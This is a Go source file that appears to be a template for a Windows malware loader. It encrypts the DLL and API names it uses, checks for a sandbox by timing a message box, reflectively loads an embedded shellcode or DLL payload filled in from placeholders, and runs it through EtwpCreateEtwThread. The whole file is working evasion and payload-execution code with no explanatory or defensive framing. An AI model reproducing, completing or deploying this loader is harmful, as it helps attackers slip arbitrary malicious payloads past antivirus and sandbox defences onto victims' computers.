package payload

/*
typedef void (*CALLBACK)(void* ,int,void*);
typedef void (*arg0)();
typedef struct{
	int* addr;
	int* base;
}Info;
void test(Info* info){
	((CALLBACK)(info->addr))(info->base,2,0);
}
void start(Info* info){
	((arg0)(info->addr))();
}
*/
import "C"

import (
	//"golang.org/x/sys/windows"
	//"net/http"
	"syscall"
	"unsafe"
	"time"
	"t1/crypto"
	"encoding/json"
	//"fmt"
	"log"
)


var payload []byte=[]byte{$shellcode$}



 func LoadDll(a *crypto.AseECB, dllName []byte)(*syscall.DLL,error){
	decrypted := a.Decrypt(dllName,crypto.Key,128)
 	return syscall.LoadDLL(string(decrypted))
 }

 func LoadFunc(a *crypto.AseECB,dll *syscall.DLL,funcName []byte)(*syscall.Proc){
	decrypted := a.Decrypt(funcName,crypto.Key,128)
	return dll.MustFindProc(string(decrypted))
	
 }
func RunInSandBox(funcs []*syscall.Proc)bool{
	
	txt:=[]uint16{0x45,0x72,0x72,0x6f,0x72}
	start:=time.Now()
	
	funcs[0].Call(0,uintptr(unsafe.Pointer(&txt[0])),0,0)
	elapsedTime:=time.Since(start).Seconds()
	return int(elapsedTime)<2
}
func Init(a *crypto.AseECB)([]*syscall.Proc,bool){
	
	kernel32Name:=[]byte{0xf8,0x87,0xe2,0x52,0x4b,0xeb,0x19,0xc0,0x5f,0x56,0xa3,0x64,0x7f,0xa9,0x87,0x89}
	ntdllName:=[]byte{0xcd,0x0a,0xf9,0xa0,0x4a,0x78,0x46,0xde,0xf5,0x56,0x11,0x5a,0x03,0xd3,0xd0,0x03}
	userdllName:=[]byte{0x04,0x9f,0x28,0xb6,0xcf,0xbd,0x7f,0x0d,0x27,0x9d,0xa0,0x79,0x78,0x2b,0x0e,0xd1}
	ntdll,_:=LoadDll(a,ntdllName)
	kernel32,_:=LoadDll(a,kernel32Name)
	userdll,_:=LoadDll(a,userdllName)
	messageBoxName:=[]byte{0xc5,0xfb,0xf1,0x60,0xff,0x7d,0x81,0xe0,0xa8,0x3c,0x22,0x6f,0x77,0x78,0xcc,0x38}
	virtualAllocName:=[]byte{0x58,0x97,0xaf,0x9f,0xba,0xee,0x7f,0x63,0x34,0xb4,0x8b,0xde,0x17,0x9f,0x73,0x9f}
	//rtlCopyMemoryName:=[]byte{0x8e,0x08,0x07,0x78,0x5b,0xa0,0x0d,0xa8,0x79,0xc1,0x03,0xa8,0x6b,0xc7,0x83,0x3d}
	virtualProtectName:=[]byte{0x95,0xe7,0xc2,0xa7,0xe7,0xff,0xe6,0x8f,0x57,0x4a,0x0c,0x08,0x83,0x65,0x93,0x18}
	etwpCreateEtwThreadName:=[]byte{0x83,0xa6,0x07,0xcb,0x1d,0x79,0xb0,0x8b,0x6f,0xe9,0x96,0x99,0xf9,0x91,0xb2,0x7f,0x61,0xd0,0x59,0x8f,0xd0,0x32,0x93,0xa3,0xf7,0x0f,0x49,0x57,0x22,0xac,0x19,0x98}
	waitForSingleObjectName:=[]byte{0xf4,0x0d,0x61,0x62,0x6f,0xf0,0x6a,0x87,0x70,0x10,0x94,0x11,0x31,0x90,0xfc,0x4b,0xf7,0xb7,0x5d,0xa6,0xc0,0xff,0x1a,0xbb,0xd5,0x12,0x87,0x05,0x52,0x07,0x26,0x51}
	LoadLibraryA:=[]byte{0x7f,0xbf,0xeb,0x6f,0x46,0xb6,0xc6,0x3f,0x1d,0xd0,0xdc,0x13,0x55,0x0e,0x89,0x8f}
	//RtlAddFunction:=[]byte{0xbb,0x8f,0xf2,0xbc,0x21,0xf3,0xad,0x65,0xd4,0x48,0xbc,0xf4,0xf9,0x92,0x5d,0x9b,0x83,0xe9,0xb0,0x54,0xb0,0x4d,0x93,0xd5,0x69,0xb5,0xdc,0x6b,0x26,0x5b,0x1c,0x8c}
	GetProcAddr:=[]byte{0x96,0xc5,0xf2,0x76,0xa2,0xce,0xd3,0xf8,0xe0,0x64,0xd9,0xb2,0xf3,0x03,0xcc,0xa7}
	//var f *windows.LazyProc
	funcs:=make([]*syscall.Proc,0)
	funcs=append(funcs,LoadFunc(a,userdll,messageBoxName))
	if(RunInSandBox(funcs)){
		return funcs,false;
	}
	funcs=append(funcs,LoadFunc(a,kernel32,virtualAllocName))
	//funcs=append(funcs,LoadFunc(a,ntdll,rtlCopyMemoryName))
	funcs=append(funcs,LoadFunc(a,kernel32,virtualProtectName))
	funcs=append(funcs,LoadFunc(a,ntdll,etwpCreateEtwThreadName))
	funcs=append(funcs,LoadFunc(a,kernel32,waitForSingleObjectName))
	funcs=append(funcs,LoadFunc(a,kernel32,LoadLibraryA))
	funcs=append(funcs,nil)
	funcs=append(funcs,LoadFunc(a,kernel32,GetProcAddr))
	return funcs,true
}


func Gen1(){
	log.Println("enter")
	a:=crypto.NewAseECB()
	funcs,succ:=Init(a)
	if !succ{
		
		return
	}
	log.Println("Init")
	var info FileHeaderInfo
	infoJson:=$fileInfo$
	err := json.Unmarshal([]byte(infoJson), &info)
	if err != nil {
		return 
	}
	r:=&Refloader{a:a,FileHeaderInfo:info,file:payload,funcs:funcs}
	log.Println("before load")
	addr,base,err:=r.Load("$entryFuncName$")
	if err!=nil{
		return
	}
	log.Printf("after load,addr: %X,%X\r\n",addr,base)
	
	thread, _, _:= funcs[3].Call(uintptr(unsafe.Pointer(C.start)), uintptr(unsafe.Pointer(&C.Info{(*C.int)(unsafe.Pointer(addr)),(*C.int)(unsafe.Pointer(base))})))
	if thread==0{
		
		return
	}
	log.Println("thread start")
	ret, _, _:= funcs[4].Call(thread, 0xFFFFFFFF)
	
	if ret==uintptr(0xffffffff){
		
		return
	}
	log.Println("thread finish")
	time.Sleep(5*time.Second)
	
}